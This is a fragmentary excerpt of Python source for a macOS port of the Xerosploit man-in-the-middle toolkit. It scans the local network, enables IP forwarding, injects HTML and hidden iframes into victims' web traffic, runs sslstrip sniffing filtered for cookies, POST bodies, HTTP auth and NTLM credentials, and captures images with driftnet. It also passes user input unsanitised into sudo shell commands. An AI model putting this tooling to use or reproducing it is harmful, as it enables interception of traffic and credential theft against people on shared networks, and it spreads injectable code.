...
#Configure the network interface and gateway. 
		def config0():
			...
			if gateway == "0":
				gateway = os.popen("netstat -nr| grep 'default' | awk '{print $2}'|xargs|awk -F '[\\n]' '{print $1}'|xargs|awk -F '[ ]' '{print $1}'").read()
				gateway = gateway.replace("\n","")
		...
		def home():
			...
			config0()
			n_name = os.popen('/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -I |grep "SSID"|xargs|awk -F \'[ ]\' \'{print $4}\'').read() # Get wireless network name
			n_mac = os.popen("ifconfig en0|grep \"ether\"|xargs|awk -F '[ ]' '{print $2}'").read() # Get network mac
			n_ip = os.popen("ifconfig|grep 'inet '|grep -v '127.0'|xargs|awk -F '[ :]' '{print $2}'").read() # Local IP address
...
[+][ Program Portable : @CoolCat  Gayhub: https://github.com/TheKingOfDuck ][+]
...
└═════════════════════════════════════════════════════════════════════════════┘     \n \033[1;m""")
		...
		def scan(): 
			...
			devices_mac = os.popen("grep MAC /opt/xerosploit/tools/log/scan.txt | awk '{print $3}'").read() + os.popen("ifconfig en0|grep \"ether\"|xargs|awk -F '[ ]' '{print $2}'").read().upper() # get devices mac and localhost mac address
...
#modules section
			def program0():
				...
				cmd_target = os.popen("sysctl -w net.inet.ip.forwarding=1").read() # IP forwarding
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def dos():
							...
							if action_dos == "back":
								...
								# print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								print("\033[1;91m\n[!] Hping3 only supports MacOS10.11-12. My time was limited so I decided to get rid of it\033[1;m")
								dos()
						dos()
						...
						def inject_html():
							...
							if action_inject == "back":
								...
								if html_file == "back":
									...
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									cmd_code = os.system("sudo cp " + html_file + " /opt/xerosploit/tools/bettercap/modules/tmp/file.html")
							...
							if action_snif == "back":
								...
								def snif_sslstrip():
									...
									if action_snif_sslstrip == "y":
										...
										make_file = os.system("sudo mkdir -p /opt/xerosploit/xerosniff && cd /opt/xerosploit/xerosniff && touch " + filename + ".log")
										cmd_show_log = os.system("""sudo xterm -geometry 100x24 -T 'Xerosploit' -hold -e "tail -f /opt/xerosploit/xerosniff/""" + filename + """.log  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ips +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &""")
										...
										def snifflog():
											...
											if action_log == "n":
												cmd_log = os.system("sudo rm /opt/xerosploit/xerosniff/" + filename + ".*")
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def yplay():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'Youkuplay' command.\n\033[1;m")
							...
							if action_yplay == "back":
								...
								print("\033[1;32m\n[+] Insert a youtku video url. \n\033[1;m")
								print("""\033[1;32m\n[+]eg: https://v.youku.com/v_show/id_XMjQwOTM4NDQ4.html?spm=a2h0k.11417342.soresults.dselectbutton&s=70cd4334278211e097c0\n\033[1;m""")
								...
								if video_id == "back":
									...
									print("\033[1;91m\n[!] Error : Please specify your video url.\033[1;m")
									yplay()
								elif video_id == "exit":
									sys.exit(exit_msg)	
								elif video_id == "home":
									...
									code = "<head> <iframe width='0' height='0' src='" + video_id + "' frameborder='0' allowfullscreen></iframe>"
									code_yplay = open('/opt/xerosploit/tools/bettercap/modules/tmp/yplay.txt','w')
									code_yplay.write(code)
									code_yplay.close()
									print("\033[1;34m\n[++] PLaying : " + video_id + " \033[1;m")
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def driftnet():
							...
							if action_driftnet == "back":
								...
								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
								cmd_driftnet = os.system("sudo mkdir -p /opt/xerosploit/xedriftnet && driftnet -d /opt/xerosploit/xedriftnet > /dev/null 2>&1 &")
								cmd_driftnet_sniff = os.system("xettercap  -X")
								cmd_driftnet_2 = os.system("sudo rm -R /opt/xerosploit/xedriftnet")
								driftnet()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								driftnet()
			...
			while True:
				...
				if cmd_0 == "scan": # Map the network
					...
					def rm_log():
						...
						if cmd_rmlog == "y":
							rmlog = os.system("sudo rm -f -R /opt/xerosploit/xerosniff/ /opt/xerosploit/tools/log/* /opt/xerosploit/tools/bettercap/modules/tmp/* /opt/xerosploit/tools/files/dns.conf")
